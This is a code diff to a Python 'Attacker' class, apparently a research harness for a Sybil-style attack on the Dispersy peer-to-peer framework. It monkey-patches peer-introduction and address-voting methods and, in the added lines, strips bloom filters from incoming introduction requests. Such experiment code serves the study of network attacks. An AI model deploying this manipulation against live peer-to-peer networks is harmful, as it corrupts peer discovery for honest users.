@@ -20,7 +20,7 @@ class Attacker:
         # step 2, replace wan_address_vote method
         dispersy.wan_address_vote = lambda address, voter: None
 
-        # step 3, wrap add_candidate method for current communities
+        # step 3, wrap methods for current communities
         def add_candidate(community, candidate):
             if not isinstance(candidate, BootstrapCandidate) and not self.is_my_sibel(candidate):
                 if candidate.sock_addr not in community._candidates:
@@ -39,6 +39,11 @@ class Attacker:
             print >> sys.stderr, "introducing", candidate_port, "to", exclude_candidate
             return candidate
 
+        def on_intro_request(orig_handler, messages):
+            for message in messages:
+                message.payload._bloom_filter = None
+            orig_handler(messages)
+
         for community in dispersy.get_communities():
             if isinstance(community, AllChannelCommunity):
                 community.old_add_candidate = community.add_candidate
@@ -46,6 +51,10 @@ class Attacker:
 
                 community.old_get_introduce_candidate = community.dispersy_get_introduce_candidate
                 community.dispersy_get_introduce_candidate = get_introduce_candidate
+
+                intro_request = community._meta_messages[u"dispersy-introduction-request"]
+                orig_handler = intro_request.handle_callback
+                intro_request._handle_callback = lambda messages, orig_handler = orig_handler: on_intro_request(orig_handler, messages)
 
         # step 4, schedule disconnect
         dispersy.callback.register(self.disconnect, delay=400.0)
